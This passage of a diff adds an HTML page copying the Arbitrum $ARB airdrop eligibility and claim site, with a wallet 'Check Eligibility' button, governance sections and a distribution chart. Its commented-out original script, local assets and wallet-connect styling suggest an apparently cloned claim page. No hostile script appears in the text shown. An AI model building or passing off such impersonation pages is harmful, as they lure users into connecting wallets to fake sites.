@@ -1,0 +1,926 @@
+<!doctype html>
+<html lang="en" style="--w3m-color-fg-1:rgb(20,20,20); --w3m-color-fg-2:rgb(121,134,134); --w3m-color-fg-3:rgb(158,169,169); --w3m-color-bg-1:rgb(255,255,255); --w3m-color-bg-2:rgb(241,243,243); --w3m-color-bg-3:rgb(228,231,231); --w3m-color-overlay:rgba(0,0,0,0.1); --w3m-accent-color:#3396FF; --w3m-accent-fill-color:#FFFFFF; --w3m-z-index:89; --w3m-background-color:#3396FF; --w3m-background-border-radius:8px; --w3m-container-border-radius:30px; --w3m-wallet-icon-border-radius:15px; --w3m-input-border-radius:28px; --w3m-button-border-radius:10px; --w3m-notification-border-radius:36px; --w3m-secondary-button-border-radius:28px; --w3m-icon-button-border-radius:50%; --w3m-button-hover-highlight-border-radius:10px; --w3m-text-big-bold-size:20px; --w3m-text-big-bold-weight:600; --w3m-text-big-bold-line-height:24px; --w3m-text-big-bold-letter-spacing:-0.03em; --w3m-text-big-bold-text-transform:none; --w3m-text-xsmall-bold-size:10px; --w3m-text-xsmall-bold-weight:700; --w3m-text-xsmall-bold-line-height:12px; --w3m-text-xsmall-bold-letter-spacing:0.02em; --w3m-text-xsmall-bold-text-transform:uppercase; --w3m-text-xsmall-regular-size:12px; --w3m-text-xsmall-regular-weight:600; --w3m-text-xsmall-regular-line-height:14px; --w3m-text-xsmall-regular-letter-spacing:-0.03em; --w3m-text-xsmall-regular-text-transform:none; --w3m-text-small-thin-size:14px; --w3m-text-small-thin-weight:500; --w3m-text-small-thin-line-height:16px; --w3m-text-small-thin-letter-spacing:-0.03em; --w3m-text-small-thin-text-transform:none; --w3m-text-small-regular-size:14px; --w3m-text-small-regular-weight:600; --w3m-text-small-regular-line-height:16px; --w3m-text-small-regular-letter-spacing:-0.03em; --w3m-text-small-regular-text-transform:none; --w3m-text-medium-regular-size:16px; --w3m-text-medium-regular-weight:600; --w3m-text-medium-regular-line-height:20px; --w3m-text-medium-regular-letter-spacing:-0.03em; --w3m-text-medium-regular-text-transform:none; --w3m-font-family:-apple-system, system-ui, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Ubuntu, &quot;Helvetica Neue&quot;, sans-serif; --w3m-success-color:rgb(38,181,98); --w3m-error-color:rgb(242, 90, 103); --w3m-background-image-url:none;">
+  <head>
+    <meta charset="utf-8">
+    <title>Arbitrum — Check your airdrop eligibility to govern Arbitrum</title>
+    <meta name="description" content="Discover if you are eligible to receive the Arbitrum airdrop, claim your tokens, and delegate your voting power">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
+    <meta name="next-head-count" content="4">
+    <meta property="og:title" content="Arbitrum — Check your airdrop eligibility to govern Arbitrum">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Arbitrum — Check your airdrop eligibility to govern Arbitrum">
+    <meta property="og:image" content="https://arbitrum.foundation/preview.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <link rel="icon" href="https://arbitrum.foundation/favicon.ico">
+    <link rel="stylesheet" href="main.css">
+    <!-- <script defer="defer" src="./static/js/main.c545e4f4.js"></script> -->
+    <link href="./static/css/main.d8dc23a2.css" rel="stylesheet">
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+      <div>
+        <div id="__next">
+          <main class="home">
+            <header id="header" class="">
+              <div class="l-Header">
+                <div class="l-Header__inner">
+                  <div class="flex items-center">
+                    <a class="c-Logo" href="./">Arbitrum</a>
+                    <div class="items-center lg:flex lg:space-x-2 xl:space-x-6 ">
+                      <div class="relative inline-block text-left text-base" data-headlessui-state="">
+                        <div>
+                          <button class="font-semibold arb-hover hidden items-center whitespace-nowrap rounded-md text-base text-white lg:inline-flex lg:p-1" type="button" aria-expanded="false" data-headlessui-state="" id="headlessui-popover-button-:Rb4cm:">Learn <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="ml-1 h-4 w-4 shrink-0 grow-0 text-white">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 8.25l-7.5 7.5-7.5-7.5"></path>
+                            </svg>
+                          </button>
+                        </div>
+                      </div>
+                      <div class="relative inline-block text-left text-base" data-headlessui-state="">
+                        <div>
+                          <button class="font-semibold arb-hover hidden items-center whitespace-nowrap rounded-md text-base text-white lg:inline-flex lg:p-1" type="button" aria-expanded="false" data-headlessui-state="" id="headlessui-popover-button-:Rd4cm:">Ecosystem <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="ml-1 h-4 w-4 shrink-0 grow-0 text-white">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 8.25l-7.5 7.5-7.5-7.5"></path>
+                            </svg>
+                          </button>
+                        </div>
+                      </div>
+                      <a class="arb-hover hidden whitespace-nowrap font-semibold text-base text-white lg:block lg:pr-4" href="./orbit">Arbitrum Orbit</a>
+                    </div>
+                  </div>
+                  <div class="items-center justify-end lg:flex lg:space-x-2 xl:space-x-4">
+                    <div id="header-content-root" class="flex space-x-2 xl:space-x-4"></div>
+                    <nav class="l-Header__connect">
+                      <ul>
+                        <li>
+                          <!-- <button class="[ c-Button c-Button--blue ]" autofocus="">0x050...AE23d</button> -->
+                        </li>
+                        <li class="only-desktop">
+                          <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/arbitrum" title="Twitter" class="[ l-Header__connect-icon ] [ twitter-icon ]">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="20.317" viewBox="0 0 25 20.317">
+                              <path id="iconmonstr-twitter-1" d="M25,4.653a10.24,10.24,0,0,1-2.946.807,5.137,5.137,0,0,0,2.255-2.838,10.275,10.275,0,0,1-3.257,1.245,5.132,5.132,0,0,0-8.741,4.677A14.561,14.561,0,0,1,1.741,3.187a5.136,5.136,0,0,0,1.586,6.848,5.107,5.107,0,0,1-2.322-.642,5.133,5.133,0,0,0,4.114,5.094,5.141,5.141,0,0,1-2.317.087,5.133,5.133,0,0,0,4.792,3.561A10.313,10.313,0,0,1,0,20.261a14.52,14.52,0,0,0,7.862,2.3A14.506,14.506,0,0,0,22.441,7.308,10.442,10.442,0,0,0,25,4.653Z" transform="translate(0 -2.248)" fill="#fff"></path>
+                            </svg>
+                          </a>
+                        </li>
+                        <li class="only-desktop">
+                          <a target="_blank" rel="noopener noreferrer" href="https://discord.gg/arbitrum" title="Discord" class="[ l-Header__connect-icon ] [ discord-icon ]">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="27.81" height="20" viewBox="0 0 27.81 20">
+                              <defs>
+                                <clipPath>
+                                  <rect width="27.81" height="20" fill="#fff"></rect>
+                                </clipPath>
+                              </defs>
+                              <g transform="translate(0 0)">
+                                <g transform="translate(0 0)" clip-path="url(#clip-path)">
+                                  <path d="M24.381,2.5A11.774,11.774,0,0,0,17.69,0l-.333.381A15.846,15.846,0,0,1,23.286,3.4a19.409,19.409,0,0,0-7.167-2.286,20.146,20.146,0,0,0-4.81.048l-.4.048a17.88,17.88,0,0,0-5.4,1.5c-.881.4-1.4.69-1.4.69A16.063,16.063,0,0,1,10.357.286L10.119,0a11.774,11.774,0,0,0-6.69,2.5A31.885,31.885,0,0,0,0,16.381S2,19.833,7.262,20c0,0,.881-1.071,1.6-1.976a7.405,7.405,0,0,1-4.167-2.81l.667.4.1.071.093.054.028.012.093.054a13.954,13.954,0,0,0,1.738.81,19.987,19.987,0,0,0,3.5,1.024,16.679,16.679,0,0,0,6.167.024,15.671,15.671,0,0,0,3.452-1.024,13.625,13.625,0,0,0,2.738-1.4,7.513,7.513,0,0,1-4.31,2.833c.714.9,1.571,1.929,1.571,1.929,5.262-.167,7.286-3.619,7.286-3.619A31.885,31.885,0,0,0,24.381,2.5M9.452,14.167a2.552,2.552,0,0,1-2.429-2.643A2.537,2.537,0,0,1,9.452,8.881a2.521,2.521,0,0,1,2.429,2.643,2.537,2.537,0,0,1-2.429,2.643m8.69,0a2.552,2.552,0,0,1-2.429-2.643,2.537,2.537,0,0,1,2.429-2.643,2.537,2.537,0,0,1,2.429,2.643,2.537,2.537,0,0,1-2.429,2.643" transform="translate(0 0)" fill="#fff"></path>
+                                </g>
+                              </g>
+                            </svg>
+                          </a>
+                        </li>
+                        <li class="only-desktop">
+                          <a target="_blank" rel="noopener noreferrer" href="https://t.me/arbitrum" title="Telegram" class="[ l-Header__connect-icon ] [ telegram-icon ]">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24.001" height="20" viewBox="0 0 24.001 20">
+                              <path id="telegram-1" d="M18.384,22.779a1.189,1.189,0,0,0,1.107.145,1.16,1.16,0,0,0,.724-.84C21.084,18,23.192,7.663,23.983,3.948a.781.781,0,0,0-.26-.758.8.8,0,0,0-.8-.14C18.733,4.6,5.82,9.447.542,11.4a.822.822,0,0,0,.051,1.563c2.367.708,5.474,1.693,5.474,1.693s1.452,4.385,2.209,6.615a.876.876,0,0,0,.6.576.866.866,0,0,0,.811-.207l3.1-2.923s3.572,2.619,5.6,4.062ZM7.374,14.1,9.053,19.64l.373-3.507L19.611,6.947a.277.277,0,0,0,.033-.377.284.284,0,0,0-.376-.064L7.374,14.1Z" transform="translate(0 -3)" fill="#fff" fill-rule="evenodd"></path>
+                            </svg>
+                          </a>
+                        </li>
+                        <li class="only-mobile">
+                          <div class="flex items-center">
+                            <button class="lg:hidden" aria-label="Menu Toggle Button" id="headlessui-disclosure-button-:Rr8cm:" type="button" aria-expanded="false" data-headlessui-state="">
+                              <svg width="40" height="24" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <line x1="8" y1="1" x2="40" y2="1" stroke="#FFFFFF" stroke-width="2"></line>
+                                <line x1="8" y1="13" x2="40" y2="13" stroke="#FFFFFF" stroke-width="2"></line>
+                                <line x1="8" y1="25" x2="40" y2="25" stroke="#FFFFFF" stroke-width="2"></line>
+                              </svg>
+                            </button>
+                          </div>
+                        </li>
+                      </ul>
+                    </nav>
+                  </div>
+                </div>
+              </div>
+            </header>
+            <section class="[ l-Section l-Section--hero ]">
+              <div class="l-Hero">
+                <div class="l-Hero__cta">
+                  <h1 class="l-Hero__heading">Welcome to the future of Ethereum</h1>
+                  <h2 class="l-Hero__sub-heading">Check your eligibility to claim $ARB</h2>
+                  <section class="[ l-Section l-Section--countdown ] compact">
+                    <div class="c-Countdown">
+                      <h3 class="c-Countdown__heading">Claiming is Live:</h3>
+                      <span class="c-Countdown__timer">0d 0h 0m <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="info-icon" aria-expanded="false">
+                          <path stroke-linecap="round" stroke-linejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"></path>
+                        </svg>
+                      </span>
+                    </div>
+                  </section>
+                  <div class="l-Hero__connect">
+                    <button class="c-ConnectButton">
+                      <span></span>Check Eligibility </button>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <section class="[ l-Section l-Section--adjacent-image-text-card ] [ has-sticky ]">
+              <div class="l-Section__card">
+                <h3 class="l-Section__heading">We must decentralize</h3>
+                <p class="l-Section__lede">The Arbitrum DAO is a massive leap forward, making Arbitrum the first EVM rollup tech to reach <a target="_blank" rel="noopener noreferrer" class="text-blue hover:underline" href="https://ethereum-magicians.org/t/proposed-milestones-for-rollups-taking-off-training-wheels/11571">Stage 1</a> decentralization. </p>
+                <a target="_blank" rel="noopener noreferrer" href="https://arbitrumfoundation.medium.com/arbitrum-the-next-phase-of-decentralization-e7f8b37b5226" class="[ c-Button c-Button--blue ]">Read the announcement</a>
+              </div>
+              <div>
+                <div class="c-LazyImage  ">
+                  <span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 66.6667% 0px 0px;"></span>
+                    <img data-src="https://arbitrum.foundation/illustration_1.webp" alt="Illustration 1" src="https://arbitrum.foundation/illustration_1.webp" decoding="async" data-nimg="responsive" class=" ls-is-cached lazyloaded" sizes="100vw" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                  </span>
+                </div>
+              </div>
+            </section>
+            <section class="[ l-Section ] px-[60px]">
+              <div class="l-Section__card !bg-[rgba(38,40,42,0.8)] md:!backdrop-blur-[3px] w-full max-w-[1150px] m-auto flex-col-reverse md:flex-row flex items-center justify-center">
+                <div class="mt-6 md:mt-0">
+                  <span class="[ c-Label c-Label--dark ]">Arbitrum Orbit</span>
+                  <h3 class="c-FeatureCard__heading mt-6 !mb-6 max-w-[440px]">Starting today, anyone can easily launch a new Arbitrum chain as a Layer 3 in the Arbitrum ecosystem.</h3>
+                  <a class="[ c-Button c-Button--blue ]" href="./orbit">Learn More</a>
+                </div>
+                <div class="c-LazyImage  ">
+                  <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 320px; height: 320px; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                    <img data-src="./illustration_12.webp" alt="Illustration 12" src="./illustration_12.webp" decoding="async" data-nimg="fixed" class=" ls-is-cached lazyloaded" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                  </span>
+                </div>
+              </div>
+            </section>
+            <section class="l-Cityscape"></section>
+            <section class="[ l-Section l-Section--centered ]">
+              <div class="l-Section--centered__intro">
+                <h2 class="l-Section__heading">Who is involved?</h2>
+                <p class="l-Section__lede text-align-left px-5">Individuals across the ecosystem can participate in governance. Token holders control protocol upgrades, funds allocation, and election of a Security Council who can perform emergency upgrades. Your voting power is derived directly from the number of tokens delegated to you.</p>
+                <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                    <g transform="translate(-908.033 -2770.004)">
+                      <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                        <rect width="12" height="15" stroke="none"></rect>
+                        <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                      </g>
+                      <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                      <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                    </g>
+                  </svg>Read docs </a>
+              </div>
+              <div class="[ l-Section__3up-cards l-Section--collapse-to-carousel ]">
+                <div class="[ l-CTABlocks l-CTABlocks--3up ]">
+                  <div class="is-visible">
+                    <div class="flickity-enabled is-draggable" tabindex="0">
+                      <div class="flickity-viewport" style="height: 598px; touch-action: pan-y;">
+                        <div class="flickity-slider" style="left: 0px; transform: translateX(-0.37%);">
+                          <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(0%);">
+                            <div class="c-FeatureCard">
+                              <div>
+                                <div class="c-FeatureCard__icon">
+                                  <span class="[ c-Label c-Label--dark ]">Delegates</span>
+                                </div>
+                                <h3 class="c-FeatureCard__heading">Delegates are users who are committed to being consistently involved in governance</h3>
+                                <p>Token holders will be able to select a preferred delegate, including themselves, and can re-delegate at any time.</p>
+                              </div>
+                              <a target="_blank" rel="noopener noreferrer" href="https://forum.arbitrum.foundation/t/delegate-application-template/31">
+                                <button class="[ c-Button c-Button--blue ]">Apply to be a delegate</button>
+                              </a>
+                            </div>
+                          </div>
+                          <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(102.31%);">
+                            <div class="c-FeatureCard">
+                              <div>
+                                <div class="c-FeatureCard__icon">
+                                  <span class="[ c-Label c-Label--dark ]">Security Council</span>
+                                </div>
+                                <h3 class="c-FeatureCard__heading">The Security Council can approve protocol upgrades when a fast response is needed</h3>
+                                <p>The Security Council is composed of 12 highly reputable members of the community. Emergency upgrades require a 9-of-12 multisig.</p>
+                              </div>
+                              <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation/concepts/security-council">
+                                <button class="[ c-Button c-Button--blue ]">Read more</button>
+                              </a>
+                            </div>
+                          </div>
+                          <div class="carousel-cell is-selected" style="position: absolute; left: 0px; transform: translateX(204.62%);">
+                            <div class="c-FeatureCard">
+                              <div>
+                                <div class="c-FeatureCard__icon">
+                                  <span class="[ c-Label c-Label--dark ]">Arbitrum DAO</span>
+                                </div>
+                                <h3 class="c-FeatureCard__heading">The DAO governs Arbitrum One and Nova</h3>
+                                <p>The Arbitrum DAO includes token holders and their delegates. It has the power to upgrade the protocol and constitution, as well as elect the Security Council. Proposals for upgrades and amendments are submitted and voted on by the DAO.</p>
+                              </div>
+                              <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation/dao-constitution">
+                                <button class="[ c-Button c-Button--blue ]">Read the Constitution</button>
+                              </a>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <ol class="flickity-page-dots">
+                        <li class="dot is-selected" aria-label="Page dot 1" aria-current="step"></li>
+                      </ol>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <section class="[ l-Section l-Section--animate-text-on-scroll ]">
+              <span class="c-Label">What does this mean for users?</span>
+              <div>
+                <p class="c-AnimateTextOnScroll">
+                  <span>This</span>
+                  <span>marks</span>
+                  <span>the</span>
+                  <span>beginning</span>
+                  <span>of</span>
+                  <span>decentralized</span>
+                  <span>governance</span>
+                  <span>for</span>
+                  <span>the</span>
+                  <span>Arbitrum</span>
+                  <span>protocol.</span>
+                  <span>Users</span>
+                  <span>across</span>
+                  <span>the</span>
+                  <span>ecosystem</span>
+                  <span>will</span>
+                  <span>be</span>
+                  <span>given</span>
+                  <span>voting</span>
+                  <span>power.</span>
+                  <span>11.62%</span>
+                  <span>of</span>
+                  <span>tokens</span>
+                  <span>will</span>
+                  <span>be</span>
+                  <span>initially</span>
+                  <span>distributed</span>
+                  <span>to</span>
+                  <span>users</span>
+                  <span>and</span>
+                  <span>1.13%</span>
+                  <span>will</span>
+                  <span>be</span>
+                  <span>distributed</span>
+                  <span>to</span>
+                  <span>DAOs</span>
+                  <span>in</span>
+                  <span>the</span>
+                  <span>Arbitrum</span>
+                  <span>ecosystem.</span>
+                </p>
+              </div>
+            </section>
+            <hr>
+            <section class="[ l-Section l-Section--single ]">
+              <div class="l-Section--single__main">
+                <h2 class="l-Section__heading">Distribution</h2>
+                <div class="l-Section--single__image">
+                  <div>
+                    <svg width="600" height="640" viewBox="-300,-320,600,640" style="max-width: 100%;">
+                      <line x1="-180" y1="-120" x2="-180" y2="-270" style="stroke: rgb(128, 128, 128);"></line>
+                      <rect x="-220" y="-270" width="170" height="30" style="stroke: rgb(128, 128, 128);"></rect>
+                      <circle cx="-205" cy="-255" r="8" fill="#575756"></circle>
+                      <text font-family="&quot;Maison Neue Mono&quot;, &quot;Courier New&quot;, Courier, monospace" font-size="13" text-anchor="start" x="-190" y="-250" style="fill: white;">INVESTORS 17.53%</text>
+                      <line x1="10" y1="-220" x2="10" y2="-320" style="stroke: rgb(128, 128, 128);"></line>
+                      <rect x="-80" y="-320" width="307" height="30" style="stroke: rgb(128, 128, 128);"></rect>
+                      <circle cx="-65" cy="-305" r="8" fill="#96BEDC"></circle>
+                      <text font-family="&quot;Maison Neue Mono&quot;, &quot;Courier New&quot;, Courier, monospace" font-size="13" text-anchor="start" x="-50" y="-300" style="fill: white;">DAOs IN ARBITRUM ECOSYSTEM 1.13%</text>
+                      <line x1="90" y1="-200" x2="90" y2="-270" style="stroke: rgb(128, 128, 128);"></line>
+                      <rect x="50" y="-270" width="248" height="30" style="stroke: rgb(128, 128, 128);"></rect>
+                      <circle cx="65" cy="-255" r="8" fill="#28A0F0"></circle>
+                      <text font-family="&quot;Maison Neue Mono&quot;, &quot;Courier New&quot;, Courier, monospace" font-size="13" text-anchor="start" x="80" y="-250" style="fill: white;">INDIVIDUAL WALLETS 11.62%</text>
+                      <line x1="-150" y1="170" x2="-150" y2="250" style="stroke: rgb(128, 128, 128);"></line>
+                      <rect x="-300" y="250" width="360" height="30" style="stroke: rgb(128, 128, 128);"></rect>
+                      <circle cx="-285" cy="265" r="8" fill="#2D374B"></circle>
+                      <text font-family="&quot;Maison Neue Mono&quot;, &quot;Courier New&quot;, Courier, monospace" font-size="13" text-anchor="start" x="-270" y="270" style="fill: white;">TEAM AND FUTURE TEAM + ADVISORS 26.94%</text>
+                      <line x1="165" y1="150" x2="165" y2="220" style="stroke: rgb(128, 128, 128);"></line>
+                      <rect x="100" y="220" width="198" height="30" style="stroke: rgb(128, 128, 128);"></rect>
+                      <circle cx="115" cy="235" r="8" fill="#3751D1"></circle>
+                      <text font-family="&quot;Maison Neue Mono&quot;, &quot;Courier New&quot;, Courier, monospace" font-size="13" text-anchor="start" x="130" y="240" style="fill: white;">DAO TREASURY 42.78%</text>
+                      <g stroke="none" stroke-width="1" stroke-linejoin="round">
+                        <path fill="#96BEDC" d="M2.064,-224.625A6,6,0,0,1,8.28,-230.621A230.769,230.769,0,0,1,11.365,-230.489A6,6,0,0,1,17.047,-223.986L11.073,-153.989A4.512,4.512,0,0,1,2.064,-154.372Z">
+                          <title>DAOs IN ARBITRUM ECOSYSTEM 1.13%</title>
+                        </path>
+                        <path fill="#28A0F0" d="M21.161,-223.635A6,6,0,0,1,27.864,-229.081A230.769,230.769,0,0,1,163.221,-163.136A6,6,0,0,1,163.064,-154.501L112.664,-107.62A6,6,0,0,1,104.402,-107.705A150,150,0,0,0,20.466,-148.597A6,6,0,0,1,15.307,-155.051Z">
+                          <title>INDIVIDUAL WALLETS 11.62%</title>
+                        </path>
+                        <path fill="#3751D1" d="M165.876,-151.478A6,6,0,0,1,174.499,-151.012A230.769,230.769,0,0,1,-71.48,219.42A6,6,0,0,1,-75.256,211.653L-51.601,147.012A6,6,0,0,1,-44.198,143.34A150,150,0,0,0,114.964,-96.35A6,6,0,0,1,115.476,-104.597Z">
+                          <title>DAO TREASURY 42.78%</title>
+                        </path>
+                        <path fill="#2D374B" d="M-79.133,210.234A6,6,0,0,1,-87.031,213.729A230.769,230.769,0,0,1,-209.606,-96.54A6,6,0,0,1,-201.452,-99.386L-140.005,-68.366A6,6,0,0,1,-137.22,-60.586A150,150,0,0,0,-58.762,138.011A6,6,0,0,1,-55.478,145.593Z">
+                          <title>TEAM AND FUTURE TEAM + ADVISORS 26.94%</title>
+                        </path>
+                        <path fill="#575756" d="M-199.591,-103.071A6,6,0,0,1,-202.143,-111.322A230.769,230.769,0,0,1,-8.28,-230.621A6,6,0,0,1,-2.064,-224.625L-2.064,-155.791A6,6,0,0,1,-7.754,-149.799A150,150,0,0,0,-130.231,-74.43A6,6,0,0,1,-138.144,-72.051Z">
+                          <title>INVESTORS 17.53%</title>
+                        </path>
+                      </g>
+                    </svg>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <section class="[ l-Section l-Section--horizontal-accordion ]">
+              <div>
+                <div class="l-Section__heading-cta">
+                  <h3 class="l-Section__heading">The State of Decentralization</h3>
+                  <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation/state-of-progressive-decentralization" class="c-Button c-Button--icon c-Button--blue">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                      <g transform="translate(-908.033 -2770.004)">
+                        <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                          <rect width="12" height="15" stroke="none"></rect>
+                          <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                        </g>
+                        <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                        <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                      </g>
+                    </svg>Read docs </a>
+                </div>
+                <div class="c-HorizontalAccordion">
+                  <div class="c-HorizontalAccordion__tab is-active">
+                    <div class="c-HorizontalAccordion__tab-label only-desktop">
+                      <span>1</span>
+                    </div>
+                    <div class="c-HorizontalAccordion__content">
+                      <h4 class="c-HorizontalAccordion__heading">Chain Ownership</h4>
+                      <p class="lede">Chain ownership of both Arbitrum One and Arbitrum Nova is under the control of the Arbitrum Governance system.</p>
+                      <p>Comprised of both the Arbitrum DAO and the Security Council, the governance system currently has the ability to alter itself. Arbitrum One has now reached Stage 1 decentralization.</p>
+                    </div>
+                  </div>
+                  <div class="c-HorizontalAccordion__tab ">
+                    <div class="c-HorizontalAccordion__tab-label only-desktop">
+                      <span>2</span>
+                    </div>
+                    <div class="c-HorizontalAccordion__content">
+                      <h4 class="c-HorizontalAccordion__heading">Validator Ownership</h4>
+                      <p class="lede">Execution on Arbitrum is validated to Ethereum Mainnet by a set of validators.</p>
+                      <p>This set of validators has been expanded to include <a target="_blank" rel="noopener noreferrer" class="underline" href="https://offchain.medium.com/arbitrum-decentralization-update-39f093768c42">organizations across the ecosystem</a>. All validators would have to be malicious for an incorrect transaction to be accepted. </p>
+                    </div>
+                  </div>
+                  <div class="c-HorizontalAccordion__tab ">
+                    <div class="c-HorizontalAccordion__tab-label only-desktop">
+                      <span>3</span>
+                    </div>
+                    <div class="c-HorizontalAccordion__content">
+                      <h4 class="c-HorizontalAccordion__heading">Sequencer Ownership</h4>
+                      <p class="lede">The Sequencers for both Arbitrum One and Arbitrum Nova are currently maintained by the Arbitrum Foundation.</p>
+                      <p>Governance currently has the power to select new Sequencers.</p>
+                    </div>
+                  </div>
+                  <div class="c-HorizontalAccordion__tab ">
+                    <div class="c-HorizontalAccordion__tab-label only-desktop">
+                      <span>4</span>
+                    </div>
+                    <div class="c-HorizontalAccordion__content">
+                      <h4 class="c-HorizontalAccordion__heading">Data Availability Committee (DAC) Ownership</h4>
+                      <p class="lede">Arbitrum Nova has a 7-party DAC, whose members can be seen <a target="_blank" rel="noopener noreferrer" href="https://developer.arbitrum.io/public-chains#arbitrum-chains-summary" class="underline">here</a>. </p>
+                      <p>The Arbitrum governance system currently has the power to change the DAC, by adding or removing members, or modifying the DAC’s role in the system.</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </section>
+            <section class="[ l-Section l-Section--carousel ]">
+              <div class="l-Section--cta-blocks__intro">
+                <h2 class="l-Section__heading">Community Values</h2>
+              </div>
+              <div class="[ c-Carousel ] flickity-fade flickity-enabled is-draggable" tabindex="0">
+                <div class="flickity-viewport" style="height: 543px; touch-action: pan-y;">
+                  <div class="flickity-slider" style="left: 0px; transform: translateX(0%);">
+                    <div class="[ c-Carousel__slide ] flickity-slide is-selected" style="position: absolute; left: 0px; transform: translateX(0%);">
+                      <div class="c-Carousel__slide-graphic">
+                        <div class="c-LazyImage  ">
+                          <span style="box-sizing: border-box; display: block; overflow: hidden; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+                            <span style="box-sizing: border-box; display: block; background-image: none; opacity: 1; border: 0px; margin: 0px; padding: 100% 0px 0px;"></span>
+                            <img data-src="./illustration_3-1.webp" alt="Illustration 3" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="lazyload" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+                            <noscript></noscript>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="c-Carousel__slide-content">
+                        <ul class="c-Carousel__slide-content-labels">
+                          <li>1/5</li>
+                          <li>Ethereum Aligned</li>
+                        </ul>
+                        <p>Arbitrum should be fundamentally aligned with the Ethereum ecosystem and a constructive member of the Ethereum community.</p>
+                        <div class="c-Carousel__slide-content-actions">
+                          <button class="c-Carousel__arrow" aria-label="prev"></button>
+                          <button class="c-Carousel__arrow" aria-label="next"></button>
+                          <a target="_blank" rel="noopener noreferrer" href="https://docs.arbitrum.foundation" class="c-Button c-Button--icon c-Button--blue">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="19.967" height="22.996" viewBox="0 0 19.967 22.996">
+                              <g transform="translate(-908.033 -2770.004)">
+                                <g transform="translate(916 2778)" fill="none" stroke="#fff" stroke-width="2">
+                                  <rect width="12" height="15" stroke="none"></rect>
+                                  <rect x="1" y="1" width="10" height="13" fill="none"></rect>
+                                </g>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22779.682 22145.254)" fill="none" stroke="#94cff7" stroke-width="2"></path>
+                                <path d="M-21866.617-19355.25v-15h12" transform="translate(22775.65 22141.254)" fill="none" stroke="#53b3f3" stroke-width="2"></path>
+                              </g>
+                            </svg>Read docs </a>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="[ c-Carousel__slide ] flickity-slide" aria-hidden="true" style="position: absolute; left: 0px; transform: translateX(100%);">
+                      <div class="c-Carousel__slide-graphic">
+                        <div class="c-LazyImage  ">
